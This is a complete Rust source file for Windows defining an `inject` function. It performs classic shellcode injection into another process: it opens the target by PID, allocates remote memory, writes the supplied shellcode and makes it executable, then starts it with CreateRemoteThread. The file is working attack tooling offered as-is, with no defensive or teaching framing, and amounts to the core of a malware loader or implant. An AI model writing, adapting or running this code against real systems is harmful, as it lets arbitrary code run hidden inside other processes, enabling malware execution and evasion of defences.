#![cfg(target_os = "windows")]

use anyhow::{bail, Result};
use windows_sys::Win32::{
    Foundation::{CloseHandle, HANDLE, INVALID_HANDLE_VALUE},
    System::{
        Diagnostics::Debug::WriteProcessMemory,
        Memory::{
            VirtualAllocEx, VirtualProtectEx,
            MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE,
        },
        Threading::{
            CreateRemoteThread, GetThreadId, OpenProcess,
            PROCESS_CREATE_THREAD, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
        },
    },
};

/// Inject shellcode into `pid` via VirtualAllocEx/WriteProcessMemory/CreateRemoteThread.
/// Returns the remote thread ID on success.
pub fn inject(pid: u32, shellcode: &[u8]) -> Result<u32> {
    unsafe {
        let access = PROCESS_CREATE_THREAD
            | PROCESS_VM_OPERATION
            | PROCESS_VM_READ
            | PROCESS_VM_WRITE;
        let proc: HANDLE = OpenProcess(access, 0, pid);
        if proc == 0 || proc == INVALID_HANDLE_VALUE {
            bail!("OpenProcess({pid}) failed");
        }

        let remote_buf = VirtualAllocEx(
            proc,
            std::ptr::null_mut(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if remote_buf.is_null() {
            CloseHandle(proc);
            bail!("VirtualAllocEx failed");
        }

        let mut written = 0usize;
        if WriteProcessMemory(
            proc,
            remote_buf,
            shellcode.as_ptr() as _,
            shellcode.len(),
            &mut written,
        ) == 0
            || written != shellcode.len()
        {
            CloseHandle(proc);
            bail!("WriteProcessMemory failed ({written}/{} bytes)", shellcode.len());
        }

        let mut old_protect = 0u32;
        VirtualProtectEx(
            proc,
            remote_buf,
            shellcode.len(),
            PAGE_EXECUTE_READ,
            &mut old_protect,
        );

        let thread = CreateRemoteThread(
            proc,
            std::ptr::null_mut(),
            0,
            Some(std::mem::transmute(remote_buf)),
            std::ptr::null_mut(),
            0,
            std::ptr::null_mut(),
        );

        CloseHandle(proc);

        if thread == 0 || thread == INVALID_HANDLE_VALUE {
            bail!("CreateRemoteThread failed");
        }

        let tid = GetThreadId(thread);
        CloseHandle(thread);
        Ok(tid)
    }
}
